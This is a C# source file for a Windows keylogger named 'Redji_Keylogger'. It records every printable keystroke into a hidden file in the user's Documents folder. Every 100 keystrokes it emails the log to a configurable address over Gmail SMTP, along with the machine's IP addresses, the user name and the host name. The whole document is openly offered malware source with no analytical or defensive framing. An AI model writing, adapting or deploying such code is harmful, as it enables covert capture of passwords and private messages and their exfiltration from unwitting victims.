using System;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;

namespace Redji_Keylogger
{
    public class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        
        static long numberOfKeystrokes = 0;

        static void Main(string[] args)
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\keystrokes.txt");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                        
                }
            }
            //Hide the file.
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

            while (true)
            {
                //Pause and let other programs run.
                Thread.Sleep(5); 

                //check all keys for their state (ASCII based).
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        Console.Write((char) i + ",");

                        //Store the strokes into a text file.
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                        numberOfKeystrokes++;

                        //Send email every 100 characters typed.
                        if (numberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }
            }

        }//main

        static void SendNewMessage()
        {
            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\keystrokes.txt";

            string logContents = File.ReadAllText(filePath);
            string emailBody = "";

            //Create a email message.
            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var adress in host.AddressList)
            {
                emailBody += "Adress: " + adress;
            }

            emailBody += "\n User: " + Environment.UserName + " \\ " + Environment.UserName;
            emailBody += "\n Host: " + host;
            emailBody += "\n Time: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("enteremailadress@gmailorelse.com");
            mailMessage.To.Add("enteremailadress@gmailorelse.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new NetworkCredential("enteremailadress@gmailorelse.com", "password123");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
        
        
    }
}
